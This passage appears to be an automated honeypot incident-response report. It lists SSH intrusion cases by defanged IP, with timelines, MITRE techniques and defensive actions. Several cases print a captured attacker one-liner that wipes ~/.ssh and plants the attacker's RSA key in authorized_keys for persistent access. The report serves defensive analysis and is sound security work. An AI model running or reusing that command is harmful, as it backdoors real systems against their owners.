| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9de5dfadd55f67cd27a32c140b2eabf2_small_control'"'"' '"'"'check_9de5dfadd55f67cd27a32c140b2eabf2'"'"'', printf '\n%s|%s\n' 'check_9de5dfadd55f67cd27a32c140b2eabf2_small_control' 'check_9de5dfadd55f67cd27a32c140b2eabf2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9de5dfadd55f67cd27a32c140b2eabf2_small_math'"'"' "$((542*775+70))"', (542*775+70, printf '\n%s|%s\n' 'check_9de5dfadd55f67cd27a32c140b2eabf2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:14:29` | `cowrie.session.connect` |
| `2026-11-09 03:14:30` | `cowrie.client.version` |
| `2026-11-09 03:14:30` | `cowrie.client.kex` |
| `2026-11-09 03:14:31` | `cowrie.login.success` |
| `2026-11-09 03:14:32` | `cowrie.client.size` |
| `2026-11-09 03:14:33` | `cowrie.session.params` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| `2026-11-09 03:14:33` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-639260db9a16

| Field | Detail |
|---|---|
| **Source IP** | `172.191.178[.]196` |
| **First Seen** | 2026-11-09 03:16 |
| **Last Seen** | 2026-11-09 03:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:16:53` | `cowrie.session.connect` |
| `2026-11-09 03:16:53` | `cowrie.client.version` |
| `2026-11-09 03:16:53` | `cowrie.client.kex` |
| `2026-11-09 03:16:53` | `cowrie.login.success` |
| `2026-11-09 03:16:53` | `cowrie.session.params` |
| `2026-11-09 03:16:53` | `cowrie.command.input` |
| `2026-11-09 03:16:53` | `cowrie.command.failed` |
| `2026-11-09 03:16:53` | `cowrie.log.closed` |
| `2026-11-09 03:16:54` | `cowrie.session.params` |
| `2026-11-09 03:16:54` | `cowrie.command.input` |
| `2026-11-09 03:16:54` | `cowrie.session.file_download` |
| `2026-11-09 03:16:54` | `cowrie.log.closed` |
| `2026-11-09 03:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.178[.]196` to AbuseIPDB if not already reported
- [ ] Block `172.191.178[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-facdf64bb9b8

| Field | Detail |
|---|---|
| **Source IP** | `172.191.178[.]196` |
| **First Seen** | 2026-11-09 03:16 |
| **Last Seen** | 2026-11-09 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:16:54` | `cowrie.session.connect` |
| `2026-11-09 03:16:54` | `cowrie.client.version` |
| `2026-11-09 03:16:54` | `cowrie.client.kex` |
| `2026-11-09 03:16:54` | `cowrie.login.success` |
| `2026-11-09 03:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.178[.]196` to AbuseIPDB if not already reported
- [ ] Block `172.191.178[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe749cc9327

| Field | Detail |
|---|---|
| **Source IP** | `117.50.55[.]100` |
| **First Seen** | 2026-11-09 03:43 |
| **Last Seen** | 2026-11-09 03:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:43:27` | `cowrie.session.connect` |
| `2026-11-09 03:43:27` | `cowrie.client.version` |
| `2026-11-09 03:43:27` | `cowrie.client.kex` |
| `2026-11-09 03:43:28` | `cowrie.login.success` |
| `2026-11-09 03:43:29` | `cowrie.session.params` |
| `2026-11-09 03:43:29` | `cowrie.command.input` |
| `2026-11-09 03:43:29` | `cowrie.command.failed` |
| `2026-11-09 03:43:29` | `cowrie.log.closed` |
| `2026-11-09 03:43:30` | `cowrie.session.params` |
| `2026-11-09 03:43:30` | `cowrie.command.input` |
| `2026-11-09 03:43:31` | `cowrie.session.file_download` |
| `2026-11-09 03:43:31` | `cowrie.log.closed` |
| `2026-11-09 03:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.55[.]100` to AbuseIPDB if not already reported
- [ ] Block `117.50.55[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2fcf2ec277

| Field | Detail |
|---|---|
| **Source IP** | `117.50.55[.]100` |
| **First Seen** | 2026-11-09 03:43 |
| **Last Seen** | 2026-11-09 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:43:31` | `cowrie.session.connect` |
| `2026-11-09 03:43:31` | `cowrie.client.version` |
| `2026-11-09 03:43:31` | `cowrie.client.kex` |
| `2026-11-09 03:43:32` | `cowrie.login.success` |
| `2026-11-09 03:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.55[.]100` to AbuseIPDB if not already reported
- [ ] Block `117.50.55[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1fb6dcc1cf1

| Field | Detail |
|---|---|
| **Source IP** | `213.154.77[.]61` |
| **First Seen** | 2026-11-09 03:50 |
| **Last Seen** | 2026-11-09 03:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:50:03` | `cowrie.session.connect` |
| `2026-11-09 03:50:03` | `cowrie.client.version` |
| `2026-11-09 03:50:03` | `cowrie.client.kex` |
| `2026-11-09 03:50:04` | `cowrie.login.success` |
| `2026-11-09 03:50:05` | `cowrie.session.params` |
| `2026-11-09 03:50:05` | `cowrie.command.input` |
| `2026-11-09 03:50:05` | `cowrie.command.failed` |
| `2026-11-09 03:50:05` | `cowrie.log.closed` |
| `2026-11-09 03:50:06` | `cowrie.session.params` |
| `2026-11-09 03:50:06` | `cowrie.command.input` |
| `2026-11-09 03:50:06` | `cowrie.session.file_download` |
| `2026-11-09 03:50:06` | `cowrie.log.closed` |
| `2026-11-09 03:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.77[.]61` to AbuseIPDB if not already reported
- [ ] Block `213.154.77[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9476ef5afe

| Field | Detail |
|---|---|
| **Source IP** | `213.154.77[.]61` |
| **First Seen** | 2026-11-09 03:50 |
| **Last Seen** | 2026-11-09 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:50:06` | `cowrie.session.connect` |
| `2026-11-09 03:50:06` | `cowrie.client.version` |
| `2026-11-09 03:50:06` | `cowrie.client.kex` |
| `2026-11-09 03:50:07` | `cowrie.login.success` |
| `2026-11-09 03:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.77[.]61` to AbuseIPDB if not already reported
- [ ] Block `213.154.77[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d3c275984f

| Field | Detail |
|---|---|
| **Source IP** | `182.76.115[.]214` |
| **First Seen** | 2026-11-09 03:53 |
| **Last Seen** | 2026-11-09 03:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:53:54` | `cowrie.session.connect` |
| `2026-11-09 03:53:54` | `cowrie.client.version` |
| `2026-11-09 03:53:55` | `cowrie.client.kex` |
| `2026-11-09 03:53:56` | `cowrie.login.success` |
| `2026-11-09 03:53:57` | `cowrie.session.params` |
| `2026-11-09 03:53:57` | `cowrie.command.input` |
| `2026-11-09 03:53:57` | `cowrie.command.failed` |
| `2026-11-09 03:53:57` | `cowrie.log.closed` |
| `2026-11-09 03:53:58` | `cowrie.session.params` |
| `2026-11-09 03:53:58` | `cowrie.command.input` |
| `2026-11-09 03:53:58` | `cowrie.session.file_download` |
| `2026-11-09 03:53:58` | `cowrie.log.closed` |
| `2026-11-09 03:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.115[.]214` to AbuseIPDB if not already reported
- [ ] Block `182.76.115[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66ecab7f168

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-11-09 03:53 |
| **Last Seen** | 2026-11-09 03:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:53:58` | `cowrie.session.connect` |
| `2026-11-09 03:53:58` | `cowrie.client.version` |
| `2026-11-09 03:53:58` | `cowrie.client.kex` |
| `2026-11-09 03:53:59` | `cowrie.login.success` |
| `2026-11-09 03:53:59` | `cowrie.session.params` |
| `2026-11-09 03:53:59` | `cowrie.command.input` |
| `2026-11-09 03:53:59` | `cowrie.command.failed` |
| `2026-11-09 03:54:00` | `cowrie.log.closed` |
| `2026-11-09 03:54:00` | `cowrie.session.params` |
| `2026-11-09 03:54:00` | `cowrie.command.input` |
| `2026-11-09 03:54:00` | `cowrie.session.file_download` |
| `2026-11-09 03:54:00` | `cowrie.log.closed` |
| `2026-11-09 03:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcb2269ff62

| Field | Detail |
|---|---|
| **Source IP** | `182.76.115[.]214` |
| **First Seen** | 2026-11-09 03:53 |
| **Last Seen** | 2026-11-09 03:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:53:59` | `cowrie.session.connect` |
| `2026-11-09 03:53:59` | `cowrie.client.version` |
| `2026-11-09 03:53:59` | `cowrie.client.kex` |
| `2026-11-09 03:54:01` | `cowrie.login.success` |
| `2026-11-09 03:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.115[.]214` to AbuseIPDB if not already reported
- [ ] Block `182.76.115[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e938d30fcf

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-11-09 03:54 |
| **Last Seen** | 2026-11-09 03:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:54:00` | `cowrie.session.connect` |
| `2026-11-09 03:54:00` | `cowrie.client.version` |
| `2026-11-09 03:54:01` | `cowrie.client.kex` |
| `2026-11-09 03:54:01` | `cowrie.login.success` |
| `2026-11-09 03:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bedc7b5c7ff

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-11-09 03:57 |
| **Last Seen** | 2026-11-09 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:57:39` | `cowrie.session.connect` |
| `2026-11-09 03:57:39` | `cowrie.client.version` |
| `2026-11-09 03:57:39` | `cowrie.client.kex` |
| `2026-11-09 03:57:39` | `cowrie.login.success` |
| `2026-11-09 03:57:39` | `cowrie.session.params` |
| `2026-11-09 03:57:39` | `cowrie.command.input` |
| `2026-11-09 03:57:39` | `cowrie.command.failed` |
| `2026-11-09 03:57:40` | `cowrie.log.closed` |
| `2026-11-09 03:57:40` | `cowrie.session.params` |
| `2026-11-09 03:57:40` | `cowrie.command.input` |
| `2026-11-09 03:57:40` | `cowrie.session.file_download` |
| `2026-11-09 03:57:40` | `cowrie.log.closed` |
| `2026-11-09 03:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44aebec4dd75

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-11-09 03:57 |
| **Last Seen** | 2026-11-09 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 03:57:40` | `cowrie.session.connect` |
| `2026-11-09 03:57:40` | `cowrie.client.version` |
| `2026-11-09 03:57:40` | `cowrie.client.kex` |
| `2026-11-09 03:57:40` | `cowrie.login.success` |
| `2026-11-09 03:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061128a479dc

| Field | Detail |
|---|---|
| **Source IP** | `45.78.230[.]231` |
| **First Seen** | 2026-11-09 04:04 |
| **Last Seen** | 2026-11-09 04:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 04:04:00` | `cowrie.session.connect` |
| `2026-11-09 04:04:00` | `cowrie.client.version` |
| `2026-11-09 04:04:01` | `cowrie.client.kex` |
| `2026-11-09 04:04:02` | `cowrie.login.success` |
| `2026-11-09 04:04:03` | `cowrie.session.params` |
| `2026-11-09 04:04:03` | `cowrie.command.input` |
| `2026-11-09 04:04:03` | `cowrie.command.failed` |
| `2026-11-09 04:04:04` | `cowrie.log.closed` |
| `2026-11-09 04:04:05` | `cowrie.session.params` |
| `2026-11-09 04:04:05` | `cowrie.command.input` |
| `2026-11-09 04:04:05` | `cowrie.session.file_download` |
| `2026-11-09 04:04:05` | `cowrie.log.closed` |
| `2026-11-09 04:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.230[.]231` to AbuseIPDB if not already reported
- [ ] Block `45.78.230[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (152) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-3381cfc53c4a | HIGH | `45.78.230[.]231` | 2026-11-09 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-00aa6a72ae5f | HIGH | `103.248.120[.]6` | 2026-11-09 04:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a92f42dab71f | HIGH | `103.248.120[.]6` | 2026-11-09 04:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cd20155f44f6 | HIGH | `185.225.41[.]192` | 2026-11-09 04:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-65b13a71b0ed | HIGH | `185.225.41[.]192` | 2026-11-09 04:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c6acb6100af6 | HIGH | `134.209.108[.]59` | 2026-11-09 04:14 | Y | 1 | 0 | `T1078` |
| IR-d489ffc5dce2 | HIGH | `2.57.122[.]209` | 2026-11-09 04:16 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cbc65a4b8f26 | HIGH | `2.57.122[.]209` | 2026-11-09 04:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1661a573c83c | HIGH | `2.57.122[.]209` | 2026-11-09 04:20 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-58bae1576cd5 | HIGH | `2.57.122[.]209` | 2026-11-09 04:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bb600026edd9 | HIGH | `2.57.122[.]209` | 2026-11-09 04:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-aaed47bd9d58 | HIGH | `2.57.122[.]209` | 2026-11-09 04:25 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-feb1eea9d645 | HIGH | `2.57.122[.]209` | 2026-11-09 04:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ec582cb734ce | HIGH | `176.53.159[.]196` | 2026-11-09 04:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2de9a5f4432e | HIGH | `65.49.1[.]172` | 2026-11-09 04:39 | Y | 3 | 0 | `T1078` |
| IR-d5ee76bfab4f | HIGH | `111.68.98[.]152` | 2026-11-09 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-412238678de8 | HIGH | `111.68.98[.]152` | 2026-11-09 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-845d131662d9 | HIGH | `115.190.211[.]57` | 2026-11-09 05:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-942bd5d725ba | HIGH | `115.190.211[.]57` | 2026-11-09 05:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-debebec40fc1 | HIGH | `160.119.66[.]206` | 2026-11-09 05:56 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-04a3cfb77710 | HIGH | `160.119.66[.]206` | 2026-11-09 05:56 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-c372fa73ad59 | HIGH | `222.118.59[.]16` | 2026-11-09 06:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7165d478e035 | HIGH | `222.118.59[.]16` | 2026-11-09 06:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-73092f26135d | HIGH | `176.53.159[.]196` | 2026-11-09 06:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-76389720f626 | HIGH | `103.159.2[.]113` | 2026-11-09 06:21 | Y | 1 | 0 | `T1078 · T1592` |
| IR-988e93e55c47 | HIGH | `193.32.162[.]15` | 2026-11-09 06:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c3a74aa8cb08 | HIGH | `49.0.87[.]123` | 2026-11-09 07:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-df958fe3c0af | HIGH | `49.0.87[.]123` | 2026-11-09 07:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47f8fe4cc9ab | HIGH | `148.153.56[.]174` | 2026-11-09 07:10 | Y | 0 | 0 | `T1078` |
| IR-068310e750f4 | HIGH | `45.17.39[.]120` | 2026-11-09 07:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f0551d8c622c | HIGH | `45.17.39[.]120` | 2026-11-09 07:16 | Y | 0 | 0 | `T1078 · T1592` |
